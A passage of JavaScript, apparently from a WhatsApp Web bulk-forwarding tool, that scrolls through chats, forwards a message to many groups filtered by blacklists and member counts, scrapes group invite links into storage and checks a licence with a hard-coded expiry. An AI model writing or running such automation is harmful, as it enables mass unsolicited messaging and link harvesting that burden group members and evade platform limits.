                    if (deep_group_check.checked) {
                        imgDefer.classList.remove("_ak8l");
                        console.log("else 30")
                        startTimer();
                    } else {
                        console.log("else 3")
                        selectpk();
                    }
                } else if (k2.title.match(regexPattern)) {
                    if (deep_group_check.checked) {
                        imgDefer.classList.remove("_ak8l");
                        console.log("else 230")
                        startTimer();
                    } else {
                        console.log("else 23")
                        selectpk();
                    }
                } else if (!isNaN(k4)) {
					if (deep_group_check.checked) {
                    if (k4 >= minVal && k4 <= maxVal) {
                        console.log("else 4kp")
                        selectpk();
                    } else {
                        imgDefer.classList.remove("_ak8l");
                        startTimer();
                        console.log(`Value is out of range (must be between ${minVal} and ${maxVal}).`);
                    }
                    } else {
                        console.log("else 3")
                        selectpk();
                    }
                } else {
                    selectpk();
                }

            }
        } else {

            if (document.querySelector(config.pksetup.scroll_area).scrollTop == "0") {
                var select_full_check = document.querySelector(config.pksetup.select_full_check);
                if (select_full_check) {

                    fullsendbtn();
                } else {
                    if (localStorage.getItem("scroll_count") == "0") {
                        localStorage.setItem("scroll_count", '1')
                    }


                    if (localStorage.getItem("wcomp_count") == "0") {
                        localStorage.setItem("wcomp_count", '1')
                    }
                    console.log("work comp");
                    cstyle("wwait", "none");
                    cstyle("wcomp", "block");
                    vzero("scroll_count");
                    localStorage.setItem("work_count", "0");
                    localStorage.setItem("autostartsend", "false");
                    cstyle("pkloadads", "none");
                    resend_run();
                }
            } else {
                var element = document.querySelector(config.pksetup.scroll_area);
                element.scrollTop = element.scrollTop - 72;
                setTimeout(startTimer, parseInt(document.getElementById("fulldelay").value) * 100);
                setTimeout(scroll_count, parseInt(document.getElementById("fulldelay").value) * 100);
            }

        }

    } else {
        stop_work_check()
    }
}


function resend_run() {
    if (!stoprun.checked) {
        console.log("resend_run");
        if (localStorage.getItem("wcomp_count") == "1") {
            localStorage.setItem("wcomp_count", '2');
            setTimeout(sendspt, parseInt(document.getElementById("fulldelay").value) * 100);
        } else if (localStorage.getItem("wcomp_count") == "2") {
            localStorage.setItem("wcomp_count", '0')
        }
    } else {
        stop_work_check()
    }
}
function calculateCount() {
    var imgDefer = document.querySelector(config.pksetup.forward);
    if (!imgDefer) {
        console.error("Forward element not found!");
        return 0;
    }

    var k2 = imgDefer.parentNode.querySelector(config.pksetup.chatsubtitle);
    if (!k2) {
        console.error("Chat subtitle element not found!");
        return 0;
    }

    const element = k2; // Directly assign the found element

    // Get the title attribute value safely
    const titleText = element.getAttribute('title') || '';

    if (!titleText.trim()) {
        console.warn("Title attribute is empty or missing.");
        return 0;
    }

    // Split the text by commas and clean entries
    const entries = titleText.split(',').map(entry => entry.trim());

    let count = 0;

    entries.forEach(entry => {
        if (entry.endsWith("more")) {
            const number = parseInt(entry.split(' ')[0], 10);
            if (!isNaN(number)) {
                count += number;
            }
        } else {
            count += 1;
        }
    });

    return count;
}
function selectpk() {
    if (!stoprun.checked) {

        console.log("selectpk");
        var blacklist_value = "pkraiyablacklist ";
        if (group_blacklist_1.checked) {
            blacklist_value += "  " + document.querySelector("#blacklist").value
        }
        if (group_blacklist_2.checked) {
            blacklist_value += "  " + document.querySelector("#blacklist2").value
        }
        if (group_blacklist_3.checked) {
            blacklist_value += "  " + document.querySelector("#blacklist3").value
        }
        if (group_blacklist_4.checked) {
            blacklist_value += "  " + document.querySelector("#blacklist4").value
        }

        var e = document.querySelector(config.pksetup.forward),
        t = e.parentNode.querySelector(config.pksetup.selectpk),
            nob = "wapk" + t.title.split(' ').join('') + "wapk",
            n = blacklist_value.split(nob).join("activeblacklist"),
            no = document.querySelector("#send_msg_group_name").value.trim(),
            nok = "wapk" + t.title.split(' ').join('') + "wapk",
            o = document.querySelector("#smdb").value.split(nok).join("pkdb");
        new RegExp("\\b" + no + "\\b").test(t.title) ? (e.classList.remove("_ak8l"), console.log("wagroupsender")) : (new RegExp("\\bactiveblacklist\\b").test(n) || new RegExp("\\bpkdb\\b").test(o) || (pkclickevent(e), detailu("tadmin"), detailu("tsend"), detailu("match_msg_check"), document.getElementById("smdb").value += "\n" + "wapk" + t.title.split(' ').join('') + "wapk ||| "+ calculateCount(), document.getElementById("sendgrouppurename").value += "\n" + t.title+ " ||| "+ calculateCount()), e.classList.remove("_ak8l")), startTimer()

    } else {
        stop_work_check()
    }
}

function sendreport(e) {
    console.log("sendreport");
    var t = localStorage.getItem("totalreport");
    t && (treport(e + t, JSON.parse(localStorage.getItem("linkstore")) + ',' + JSON.parse(localStorage.getItem("extlinkstore"))), localStorage.removeItem("totalreport"), localStorage.removeItem("linkstore"), localStorage.removeItem("extlinkstore"))
}

function addreport() {
    console.log("addreport");
    var e = document.getElementById("totalreport").innerText.split("\n").join(" • ").split("	").join(": ");
    localStorage.setItem("totalreport", e);
}

function updatedatabase() {
    console.log("updatedatabase");
    var e = document.getElementById("smdb");
    localStorage.setItem("groupnamecontentnew", e.value);
    var e = document.getElementById("tsend");
    localStorage.setItem("tsend", e.innerHTML)
}

function updatelocalstorage(t, e) {
    t = document.getElementById(t), localStorage.setItem(e, t.value)
}

function removedatabase() {
    console.log("removedatabase");
    nalert("New Message Start"), bblank("datamessageid"), bblank("matchmsg"), bblank("smdb"), bblank("sendgrouppurename"), vzero("tadmin"), vzero("tsend"), vzero("pendingsend"), vzero("match_msg_check"), vzero("scroll_count"), vzero("extract_group_link"), vzero("countlist")
}


function save_black_list(id, localstorage) {
    console.log("save_black_list");
    var e = document.getElementById(id);
    localStorage.setItem(localstorage, e.value), nalert("Blacklist Saved!")
}

function add_black_list(id, localstorage) {
    console.log("add_black_list");

    var yyye = document.querySelector(config.pksetup.channel_blacklist_title);
    var e = document.querySelector(config.pksetup.ablacklist_title),
        t = document.getElementById(id);

    if (e) {
        t.value += "\n" + "wapk" + e.title.split(' ').join('') + "wapk";
        save_black_list(id, localstorage);
    } else if (yyye) {
        t.value += "\n" + "wapk" + yyye.title.split(' ').join('') + "wapk";
        save_black_list(id, localstorage);
    } else {
        nalert("Please Click Group Name and Group Details");
    }
}


function sblacklist() {
    save_black_list("blacklist", "gblacklistnew")
}

function ablacklist() {
    add_black_list("blacklist", "gblacklistnew")
}

function sblacklist2() {
    save_black_list("blacklist2", "gblacklistnew2")
}

function ablacklist2() {
    add_black_list("blacklist2", "gblacklistnew2")
}

function sblacklist3() {
    save_black_list("blacklist3", "gblacklistnew3")
}

function ablacklist3() {
    add_black_list("blacklist3", "gblacklistnew3")
}

function sblacklist4() {
    save_black_list("blacklist4", "gblacklistnew4")
}

function ablacklist4() {
    add_black_list("blacklist4", "gblacklistnew4")
}


function get_extract_link() {
    console.log("get_extract_link");
    var t = localStorage.getItem("userextlinkstore") ? JSON.parse(localStorage.getItem("userextlinkstore")) : [];
    localStorage.setItem("userextlinkstore", JSON.stringify(t)), t = JSON.parse(localStorage.getItem("userextlinkstore")), document.getElementById("get_extract_link").value = t.join("\n"), nalert("Group Link Added");
    sendreport("ext")
}

function old_link_remove() {
    localStorage.removeItem("userextlinkstore"), nalert("Old Group Link Remove")
}

function glsave2() {
    var t = localStorage.getItem("allextlinkstore") ? JSON.parse(localStorage.getItem("allextlinkstore")) : [];
    localStorage.setItem("allextlinkstore", JSON.stringify(t));
    for (var x = document.getElementById("all_extract_link").value.split("\n"), i = 0; i < x.length; i++) x[i].indexOf("chat.whatsapp.com") && -1 === t.indexOf(x[i]) && t.push(x[i]);
    0 != t.length && (localStorage.setItem("allextlinkstore", JSON.stringify(t)), localStorage.setItem("extlinkstore", JSON.stringify(t)), localStorage.setItem("userextlinkstore", JSON.stringify(t)));
    document.getElementById("extract_group_link").innerHTML = t.length;

    document.getElementById("all_extract_link").value = "";
    glsave4();
}

function glsave4() {
    setTimeout(function () {
        document.querySelector(config.pksetup.side_panel_loading) ? setTimeout(glsave4, 50) : runscript();
    }, 50)
}

function scroll_msg_ext_link() {
    var element = document.querySelector("#pane-side");
    element.scrollTop = element.scrollTop + 72;
    setTimeout(link_extract_link, 200)
}

function link_extract_link() {
    document.getElementById("all_extract_link").value = "";
    var theString = document.querySelector('#pane-side').innerText;
    var expression = /https?:\/\/chat\.whatsapp\.com\/(?:invite\/)?[a-zA-Z0-9]+/gi;
    var regex = new RegExp(expression);
    theString = theString.match(regex);
    // console.log(theString);
    if (theString != null) {
        function removeDuplicates(arr) {
            return arr.filter((item,
                index) => arr.indexOf(item) === index);
        }
    }

    document.getElementById("all_extract_link").value = removeDuplicates(theString).join("\r\n");
    glsave2();
}

function toggleSleepInputs() {
    const sleepToggle = document.getElementById("sleepToggle");
    const sleepTimeInputs = document.getElementById("sleepTimeInputs");
    sleepTimeInputs.style.display = sleepToggle.checked ? "block" : "none";
}

function allsrcrun() {
    localStorage.setItem("wcomp_count", "0"), localStorage.setItem("scroll_count", "0"), getsetItem("smdb", "groupnamecontentnew"), getsetItem("blacklist", "gblacklistnew"), getsetItem("blacklist2", "gblacklistnew2"), getsetItem("blacklist3", "gblacklistnew3"), getsetItem("blacklist4", "gblacklistnew4"), getsetItem("contact_list_no", "contact_list_no"), getsetItem("send_msg_group_name", "send_msg_group_name"), getsetItem("datamessageid", "datamessageid"), getsetItem("saved_no_joined_name", "saved_no_joined_name"), getsetItem("send_msg_group_name", "send_msg_group_name"), getsetItem("send_msg_group_name", "send_msg_group_name"), getsetItem("matchmsg", "matchmsg"), getsetItemnumber("tsend", "tsend"), getsetItemnumber("pendingsend", "pendingsend"), localStorage.setItem("work_count", "0"), count_send_group(), pkresize(), setTimeout(sendreport("fi"), 1e3), document.getElementById("sleepToggle").addEventListener("change", toggleSleepInputs), runschedulefun(),document.getElementById('phone-id').value = findnumber()
}

function startfun() {
    var e = findnumber();
    new Date("Dec 28, 2026 00:00:00").getTime() - (new Date).getTime() < 0 ? document.body.innerHTML = "<h1 style='text-align:center;font-size:48px'>Tool Expired</h1>" : (checkvalid(e))
}
var startfunInterval = setInterval(() => {
    if (document.querySelector('#pane-side')) {
        clearInterval(startfunInterval);
        startfun();
    }
}, 100);

if (localStorage.getItem("keycodesave") == "prakash") {
    localStorage.setItem("fmissuefix", "yes");


}
/*
if(localStorage.getItem("keycodesave")=="amitsir"){
serverdown();}*/
